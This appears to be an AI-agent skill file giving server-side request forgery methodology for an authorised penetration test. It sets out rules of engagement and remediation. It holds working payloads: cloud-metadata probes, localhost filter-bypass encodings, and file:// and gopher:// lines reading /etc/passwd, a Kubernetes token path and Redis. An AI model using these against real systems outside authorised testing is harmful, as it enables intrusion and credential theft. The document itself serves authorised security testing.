---
name: web-ssrf
description: "Server-side request forgery testing for a pentest-team engagement — vector discovery (URL fetchers, webhooks, previewers, importers, PDF/image renderers), cloud-metadata reachability proven benignly, allowlist/denylist filter bypass (IP encoding, IPv6, DNS rebinding, redirect chains, parser confusion), blind SSRF via an in-scope callback listener, protocol smuggling (gopher/dict/file), and internal-service/K8s pivots. Load it when the appsec-triage input-validation sweep turns up an SSRF lead on a claimed web/API target."
---

# Server-Side Request Forgery — under the engagement protocol

Deep methodology for the SSRF class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every fetch the server makes on your behalf still originates from a target you own on the board and that is on the `ROE.md` allowlist. The SSRF *destination* obeys the same rule: reachability of an out-of-scope system is a finding, not a boundary to cross.
- **Prove reachability benignly, never pull real credentials.** An SSRF that can reach `169.254.169.254` is proven by hitting a *benign* in-scope endpoint (a marker file, a `PUT /latest/api/token` that returns a token *shape*, an internal 200 that should be unreachable) — not by exfiltrating IAM keys or dumping a DB. Reaching the metadata service is the finding; the live credential pull is the incident the ROE was written to prevent.
- **Blind SSRF goes to a BENIGN in-scope listener only.** Callbacks, OOB confirmation, and any exfil channel point at *your own in-scope* Interactsh/Collaborator/netcat subdomain — never a live external service, never a third-party rebinder pointed at real internal data.
- **Read before write; RCE and outward-facing are gated.** Port scans, gopher-to-Redis writes, `file://` reads of secrets, Docker/kubelet exec, and anything that mutates internal state are destructive/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go before running them.
- **Rate-limit and coordinate.** A 65k-port SSRF scan hammers a shared host and trips a WAF/rate-limit ban for the whole team. Throttle, and coordinate load on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run against `<in-scope>`.

## Quick workflow

1. Enumerate every server-side fetch vector on your target.
2. Stand up your in-scope callback listener; fire a benign external-shaped URL to confirm the fetch happens.
3. Pivot to internal addresses; distinguish basic (response leaks) from blind (callback only) from time-based.
4. If a filter blocks you, work the bypasses; note the control and what beat it.
5. Prove impact against a benign marker; escalate only if in scope and cleared. File the finding.

## Vectors — where the server fetches for you

URL-input features: link previewers, URL importers, "fetch from URL", webhook config, PDF/screenshot/image export, avatar-by-URL, API integrations. Proxies/content fetchers, translation, media/document processors (XML/SVG/DOCX). Common parameter names:

```
url dest redirect uri path continue next data reference site html
domain callback return page feed host port to out view dir origin
source endpoint proxy fetch img_url link site_url media_url
```

## Detection

Stand up the listener first (your own in-scope subdomain), then confirm the fetch with a benign marker before touching anything internal.

```bash
# In-scope OOB listener — pick your assigned subdomain, log to evidence
interactsh-client -v            # or: nc -lvnp 8000  on an in-scope host
# Benign confirmation payload (proves the fetch, touches nothing internal)
curl "https://<in-scope>/api/fetch?url=http://<your-oob>.<in-scope>/marker-$(date +%s)"
```

Then probe internal reachability, watching response body, status, and timing:

```
http://127.0.0.1/        http://localhost:8080/admin
http://127.0.0.1:6379/   http://169.254.169.254/     (cloud metadata — benign read only)
```

- **Basic**: internal response leaks back in the body/error.
- **Blind**: nothing returns, but your in-scope listener logs the hit.
- **Time-based**: a reachable closed port vs. a filtered one differ measurably; keep the request count low.

## Cloud metadata (prove reachability, do not harvest)

Demonstrate the metadata service is reachable — stop at proof. For AWS IMDSv2 the *proof* is that the two-step token flow is reachable via your vector, not the credential retrieval:

```
# Step 1 proves method-controlled SSRF reaches IMDSv2 (token shape is the marker)
PUT http://169.254.169.254/latest/api/token
  X-aws-ec2-metadata-token-ttl-seconds: 21600
# Reaching the security-credentials LISTING proves impact — do NOT read the role's keys
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Reachability across providers (a 200/expected header = proof, no secret pull): GCP `metadata.google.internal/computeMetadata/v1/` (`Metadata-Flavor: Google`), Azure `169.254.169.254/metadata/instance` (`Metadata: true`), ECS task `169.254.170.2/v2/`, DigitalOcean/Oracle/Alibaba variants. If the ROE forbids credential access, a documented *reachability proof* beats an actual harvest — and the harvest is gated through the anchor regardless.

## Filter bypass (when an allow/denylist sits in front)

```
# IP representations of 127.0.0.1
http://127.1/     http://0177.0.0.1/     http://0x7f.0.0.1/     http://2130706433/
# IPv6 / mapped
http://[::1]/     http://[::ffff:127.0.0.1]/     http://[::ffff:7f00:1]/
# Parser / userinfo confusion + scheme tricks
http://allowed.<in-scope>@127.0.0.1/     http://127.0.0.1#.allowed.<in-scope>
http:////127.0.0.1/     http://LoCaLhOsT/     http://127%2e0%2e0%2e1/  (+ double-encode)
```

Allowlist bypasses: an in-scope **open redirect** chained into the fetcher, or a hostname you control under an allowed suffix. **DNS rebinding** flips resolution mid-connection — use an in-scope/self-hosted rebinder pointed at a *benign* internal marker only, never at real data. Re-test after each redirect hop; note that redirects to private space bypassed validation. Record the control that was present and exactly what defeated it — the client's SSRF-filter efficacy is itself reportable.

## Protocol smuggling & internal pivots (gated — RCE/write)

These cross from read into write/OS/cluster access; do-no-harm applies and they need the human's go through the anchor:

```
file:///etc/passwd          file:///var/run/secrets/kubernetes.io/serviceaccount/token
dict://127.0.0.1:6379/info  gopher://127.0.0.1:6379/_<redis-write>   (write = gated)
# K8s/mesh from the SSRF vantage point (read-only recon before any exec)
http://127.0.0.1:10255/pods   http://127.0.0.1:15000/config_dump
```

Port-scanning localhost, gopher writes to Redis, kubelet `run` exec, and Docker-socket calls are destructive/outward-facing — proof-of-reachability first, exploitation only when cleared. On a production or no-real-data target, demonstrating the primitive exists beats popping it.

## PDF / SVG renderer SSRF

If a renderer fetches embedded resources, an SVG `foreignObject`/`iframe` pointed at a benign internal marker (or your in-scope listener) confirms server-side fetch from the render pipeline — keep the target benign, not the metadata credential path.

## Remediation (for the finding)

1. **Fix** — two-stage validation with a trusted RFC-3986 parser: validate scheme, then resolve and validate the IP/CIDR *after* DNS; re-validate after every redirect hop; deny private/link-local ranges. Prefer fetch-by-resource-ID or signed (HMAC) callbacks over arbitrary user URLs.
2. **Defense in depth** — sandboxed egress proxy enforcing allowlists post-resolution; egress filtering and network segmentation; disable unused schemes (`file`/`gopher`/`dict`); enforce IMDSv2 and block the token path for workloads that don't need metadata; request timeouts and rate limits.
3. **Detection** — alert on server-side requests to RFC-1918 / `169.254.169.254` / `metadata.google.internal`, on unexpected schemes, and on the fetcher resolving user input to private space.

Write it up in the `appsec-reporting` finding format, CWE-918 / A10:2021 SSRF, with the marker-based reproduction.
